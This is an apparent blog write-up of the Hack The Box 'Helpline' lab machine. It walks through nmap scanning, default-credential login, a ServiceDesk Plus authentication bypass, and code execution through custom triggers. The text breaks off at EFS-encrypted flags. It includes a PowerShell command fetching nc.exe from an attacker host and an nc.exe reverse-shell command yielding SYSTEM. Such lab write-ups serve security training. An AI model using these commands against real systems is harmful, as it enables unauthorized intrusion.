<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Helpline - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Helpline"><a href="#Hack-The-Box-Helpline" class="headerlink" title="Hack The Box - Helpline"></a>Hack The Box - Helpline</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as <code>nt authority/system</code> which means that I technically rooted the box. But the flags were <code>EFS</code> encrypted so I had to find a way to read them. It’s a Windows box and its ip is <code>10.10.10.152</code>, I added it to <code>/etc/hosts</code> as <code>helpline.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/helpline/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb</span><br><span class="line">Nmap scan report for helpline.htb (10.10.10.132)</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">8080&#x2F;tcp open  http-proxy    -</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP&#x2F;1.1 200 OK</span><br><span class="line">|     Set-Cookie: JSESSIONID&#x3D;65E8A121BA313E88FEEFE9C1E493AC61; Path&#x3D;&#x2F;; HttpOnly</span><br><span class="line">|     Cache-Control: private</span><br><span class="line">|     Expires: Thu, 01 Jan 1970 01:00:00 GMT</span><br><span class="line">|     Content-Type: text&#x2F;html;charset&#x3D;UTF-8</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Date: Thu, 15 Aug 2019 17:55:43 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Server: -</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;</span><br><span class="line">|     &lt;script language&#x3D;&#39;JavaScript&#39; type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&#39;&#x2F;scripts&#x2F;Login.js?9309&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">|     &lt;script language&#x3D;&#39;JavaScript&#39; type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&#39;&#x2F;scripts&#x2F;jquery-1.8.3.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">|     &lt;link href&#x3D;&quot;&#x2F;style&#x2F;loginstyle.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&#x2F;&gt;</span><br><span class="line">|     &lt;link href&#x3D;&quot;&#x2F;style&#x2F;new-classes.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link href&#x3D;&quot;&#x2F;style&#x2F;new-classes-sdp.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link href&#x3D;&quot;&#x2F;style&#x2F;conflict-fix.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP&#x2F;1.1 200 OK</span><br><span class="line">|     Set-Cookie: JSESSIONID&#x3D;27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path&#x3D;&#x2F;; HttpOnly</span><br><span class="line">|     Cache-Control: private</span><br><span class="line">|     Expires: Thu, 01 Jan 1970 01:00:00 GMT</span><br><span class="line">|     Content-Type: text&#x2F;html;charset&#x3D;UTF-8</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Date: Thu, 15 Aug 2019 17:55:45 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Server: -</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;Edge&quot;&gt;</span><br><span class="line">|     &lt;script language&#x3D;&#39;JavaScript&#39; type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&#39;&#x2F;scripts&#x2F;Login.js?9309&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">|     &lt;script language&#x3D;&#39;JavaScript&#39; type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&#39;&#x2F;scripts&#x2F;jquery-1.8.3.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">|     &lt;link href&#x3D;&quot;&#x2F;style&#x2F;loginstyle.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&#x2F;&gt;</span><br><span class="line">|     &lt;link href&#x3D;&quot;&#x2F;style&#x2F;new-classes.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link href&#x3D;&quot;&#x2F;style&#x2F;new-classes-sdp.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">|_    &lt;link href&#x3D;&quot;&#x2F;style&#x2F;conflict-fix.css?9309&quot; type&#x3D;&quot;text&#x2F;css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: -</span><br><span class="line">|_http-title: ManageEngine ServiceDesk Plus</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port8080-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;8&#x2F;15%Time&#x3D;5D55AAAF%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,2328,&quot;HTTP&#x2F;1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID&#x3D;65E8</span><br><span class="line">SF:A121BA313E88FEEFE9C1E493AC61;\x20Path&#x3D;&#x2F;;\x20HttpOnly\r\nCache-Control:\</span><br><span class="line">SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\</span><br><span class="line">SF:r\nContent-Type:\x20text&#x2F;html;charset&#x3D;UTF-8\r\nVary:\x20Accept-Encoding</span><br><span class="line">SF:\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:43\x20GMT\r\nConnection</span><br><span class="line">SF::\x20close\r\nServer:\x20-\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;</span><br><span class="line">SF:meta\x20http-equiv&#x3D;\&quot;X-UA-Compatible\&quot;\x20content&#x3D;\&quot;IE&#x3D;Edge\&quot;&gt;\n\n\n\n\</span><br><span class="line">SF:r\n\n\x20\x20\x20\x20&lt;script\x20language&#x3D;&#39;JavaScript&#39;\x20type&#x3D;\&quot;text&#x2F;ja</span><br><span class="line">SF:vascript\&quot;\x20src&#x3D;&#39;&#x2F;scripts&#x2F;Login\.js\?9309&#39;&gt;&lt;&#x2F;script&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;script\x20language&#x3D;&#39;JavaScript&#39;\x20type&#x3D;\&quot;text&#x2F;javascript\&quot;\x20src&#x3D;&#39;&#x2F;</span><br><span class="line">SF:scripts&#x2F;jquery-1\.8\.3\.min\.js&#39;&gt;&lt;&#x2F;script&gt;\n\x20\x20\x20\x20\n\x20\x20\</span><br><span class="line">SF:x20\x20&lt;link\x20href&#x3D;\&quot;&#x2F;style&#x2F;loginstyle\.css\?9309\&quot;\x20type&#x3D;\&quot;text&#x2F;cs</span><br><span class="line">SF:s\&quot;\x20rel&#x3D;\&quot;stylesheet\&quot;&#x2F;&gt;\n\x20\x20\x20\x20&lt;link\x20href&#x3D;\&quot;&#x2F;style&#x2F;new</span><br><span class="line">SF:-classes\.css\?9309\&quot;\x20type&#x3D;\&quot;text&#x2F;css\&quot;\x20rel&#x3D;\&quot;stylesheet\&quot;&gt;\n\x20</span><br><span class="line">SF:\x20\x20\x20&lt;link\x20href&#x3D;\&quot;&#x2F;style&#x2F;new-classes-sdp\.css\?9309\&quot;\x20type</span><br><span class="line">SF:&#x3D;\&quot;text&#x2F;css\&quot;\x20rel&#x3D;\&quot;stylesheet\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href&#x3D;\&quot;&#x2F;</span><br><span class="line">SF:style&#x2F;conflict-fix\.css\?9309\&quot;\x20type&#x3D;\&quot;text&#x2F;css\&quot;\x20rel&#x3D;\&quot;styleshee</span><br><span class="line">SF:t\&quot;&gt;&quot;)%r(HTTPOptions,2328,&quot;HTTP&#x2F;1\.1\x20200\x20OK\r\nSet-Cookie:\x20JSE</span><br><span class="line">SF:SSIONID&#x3D;27315C0AAF7C9B2D64D6C2B7EFD03FD9;\x20Path&#x3D;&#x2F;;\x20HttpOnly\r\nCac</span><br><span class="line">SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0</span><br><span class="line">SF:0:00\x20GMT\r\nContent-Type:\x20text&#x2F;html;charset&#x3D;UTF-8\r\nVary:\x20Acc</span><br><span class="line">SF:ept-Encoding\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:45\x20GMT\r</span><br><span class="line">SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html</span><br><span class="line">SF:&gt;\n&lt;head&gt;\n&lt;meta\x20http-equiv&#x3D;\&quot;X-UA-Compatible\&quot;\x20content&#x3D;\&quot;IE&#x3D;Edge</span><br><span class="line">SF:\&quot;&gt;\n\n\n\n\r\n\n\x20\x20\x20\x20&lt;script\x20language&#x3D;&#39;JavaScript&#39;\x20ty</span><br><span class="line">SF:pe&#x3D;\&quot;text&#x2F;javascript\&quot;\x20src&#x3D;&#39;&#x2F;scripts&#x2F;Login\.js\?9309&#39;&gt;&lt;&#x2F;script&gt;\n\x2</span><br><span class="line">SF:0\x20\x20\x20&lt;script\x20language&#x3D;&#39;JavaScript&#39;\x20type&#x3D;\&quot;text&#x2F;javascript</span><br><span class="line">SF:\&quot;\x20src&#x3D;&#39;&#x2F;scripts&#x2F;jquery-1\.8\.3\.min\.js&#39;&gt;&lt;&#x2F;script&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0\n\x20\x20\x20\x20&lt;link\x20href&#x3D;\&quot;&#x2F;style&#x2F;loginstyle\.css\?9309\&quot;\x20ty</span><br><span class="line">SF:pe&#x3D;\&quot;text&#x2F;css\&quot;\x20rel&#x3D;\&quot;stylesheet\&quot;&#x2F;&gt;\n\x20\x20\x20\x20&lt;link\x20href&#x3D;</span><br><span class="line">SF:\&quot;&#x2F;style&#x2F;new-classes\.css\?9309\&quot;\x20type&#x3D;\&quot;text&#x2F;css\&quot;\x20rel&#x3D;\&quot;stylesh</span><br><span class="line">SF:eet\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href&#x3D;\&quot;&#x2F;style&#x2F;new-classes-sdp\.css\?93</span><br><span class="line">SF:09\&quot;\x20type&#x3D;\&quot;text&#x2F;css\&quot;\x20rel&#x3D;\&quot;stylesheet\&quot;&gt;\n\x20\x20\x20\x20&lt;link</span><br><span class="line">SF:\x20href&#x3D;\&quot;&#x2F;style&#x2F;conflict-fix\.css\?9309\&quot;\x20type&#x3D;\&quot;text&#x2F;css\&quot;\x20rel</span><br><span class="line">SF:&#x3D;\&quot;stylesheet\&quot;&gt;&quot;);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -59m59s, deviation: 0s, median: -59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2019-08-15 19:57:28</span><br><span class="line">|_  start_date: N&#x2F;A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Thu Aug 15 20:58:04 2019 -- 1 IP address (1 host up) scanned in 162.71 seconds</span><br></pre></td></tr></table></figure>
<p>We got <code>http</code> on port 8080 and <code>smb</code>. I tried to list <code>smb</code> shares but I couldn’t authenticate anonymously :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;helpline# smbclient --list &#x2F;&#x2F;helpline.htb&#x2F; -U &quot;&quot;</span><br><span class="line">Enter WORKGROUP\&#39;s password: </span><br><span class="line">session setup failed: NT_STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>


<h2 id="HTTP-Initial-Enumeration-Administrative-Access"><a href="#HTTP-Initial-Enumeration-Administrative-Access" class="headerlink" title="HTTP Initial Enumeration, Administrative Access"></a>HTTP Initial Enumeration, Administrative Access</h2><p>On the <code>http</code> port there was an application called <code>ManageEngine ServiceDesk Plus</code>.<br><img src="/images/hackthebox/helpline/1.png" alt=""><br>I tried some common credentials like <code>admin:admin</code> and <code>guest:guest</code> which actually worked :<br><img src="/images/hackthebox/helpline/2.png" alt=""><br><img src="/images/hackthebox/helpline/3.png" alt=""><br>But as <code>guest</code> my capabilities were limited so I had to elevate to an administrative user. I searched for known vulnerabilities for this application and found this <a href="https://www.exploit-db.com/exploits/42037" target="_blank" rel="noopener">authentication bypass vulnerability</a>. However to exploit it I needed a valid username :<br><img src="/images/hackthebox/helpline/4.png" alt=""><br><img src="/images/hackthebox/helpline/5.png" alt=""><br><img src="/images/hackthebox/helpline/6.png" alt=""><br>luckily there was another <a href="https://www.exploit-db.com/exploits/35891" target="_blank" rel="noopener">user enumeration vulnerability</a> which I could exploit as <code>guest</code>.<br><img src="/images/hackthebox/helpline/7.png" alt=""><br><img src="/images/hackthebox/helpline/8.png" alt=""><br>Before using <code>wfuzz</code> with a long wordlist I tried some common usernames first, <code>administrator</code> was an existing user :<br><img src="/images/hackthebox/helpline/9.png" alt=""><br>To exploit the authentication bypass vulnerability we have to login as <code>guest</code>, then navigate to <code>/mc</code> and logout. After that we will login as <code>administrator</code>  by using <code>administrator</code> as username and password then return to the index page again and we will be redirected to the dashboard as <code>administrator</code>.<br><img src="/images/hackthebox/helpline/10.png" alt=""><br><img src="/images/hackthebox/helpline/11.png" alt=""><br><img src="/images/hackthebox/helpline/12.png" alt=""><br><img src="/images/hackthebox/helpline/13.gif" alt=""><br><img src="/images/hackthebox/helpline/14.png" alt=""><br>There is also a published <a href="https://www.exploit-db.com/exploits/46659" target="_blank" rel="noopener">exploit</a> that does the same thing automatically :<br><img src="/images/hackthebox/helpline/15.png" alt=""></p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>I checked the <code>Admin</code> section and <code>Custom Triggers</code> under <code>Helpdesk Customizer</code> caught my attention.<br><img src="/images/hackthebox/helpline/16.png" alt=""><br><img src="/images/hackthebox/helpline/17.png" alt=""><br>Description says : “You can define rules to automatically invoke any custom class or script file. The action rules can be applied to a request when it is created, (or received) or edited or both”<br>I ran a python <code>http</code> server to host <code>nc.exe</code> then I created a trigger that executes : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -command Invoke-WebRequest http:&#x2F;&#x2F;10.10.xx.xx&#x2F;nc.exe -OutFile C:\Windows\System32\spool\drivers\color\nc.exe</span><br></pre></td></tr></table></figure>
<p>When a request is created (it must has the word <code>test</code> in the subject).<br><img src="/images/hackthebox/helpline/18.png" alt=""><br><img src="/images/hackthebox/helpline/19.png" alt=""><br>Last thing to do is to create a request that runs the trigger :<br><img src="/images/hackthebox/helpline/20.png" alt=""><br><img src="/images/hackthebox/helpline/21.png" alt=""><br>I edited the trigger and made it execute :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 10.10.xx.xx 1337</span><br></pre></td></tr></table></figure>
<p>Then I created another request and got a reverse shell as <code>nt authority\system</code> :<br><img src="/images/hackthebox/helpline/22.png" alt=""></p>
<h2 id="Encrypted-Flags"><a href="#Encrypted-Flags" class="headerlink" title="Encrypted Flags"></a>Encrypted Flags</h2><p>Although I was <code>system</code> I couldn’t read the flags :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\ManageEngine\ServiceDesk\integration\custom_scripts&gt;c:                         </span><br><span class="line">c:              </span><br><span class="line">C:\&gt;cd Users                  </span><br><span class="line">cd Users </span><br><span class="line">C:\Users&gt;cd Administrator           </span><br><span class="line">cd Administrator</span><br><span class="line">C:\Users\Administrator&gt;cd Desktop                 </span><br><span class="line">cd Desktop</span><br><span class="line">C:\Users\Administrator\Desktop&gt;type root.txt                           </span><br><span class="line">type root.txt</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;cd tolu</span><br><span class="line">cd tolu</span><br><span class="line"></span><br><span class="line">C:\Users\tolu&gt;cd Desktop</span><br><span class="line">cd Desktop</span><br><span class="line"></span><br><span class="line">C:\Users\tolu\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is D258-5C3B</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\tolu\Desktop</span><br><span class="line"></span><br><span class="line">12&#x2F;29&#x2F;2018  10:21 PM    &lt;DIR&gt;          .</span><br><span class="line">12&#x2F;29&#x2F;2018  10:21 PM    &lt;DIR&gt;          ..</span><br><span class="line">12&#x2F;21&#x2F;2018  12:12 AM                32 user.txt</span><br><span class="line">               1 File(s)             32 bytes</span><br><span class="line">               2 Dir(s)   5,851,750,400 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\tolu\Desktop&gt;type user.txt</span><br><span class="line">type user.txt</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>
<p>That’s because the flags are <code>EFS</code> encrypted :</p>
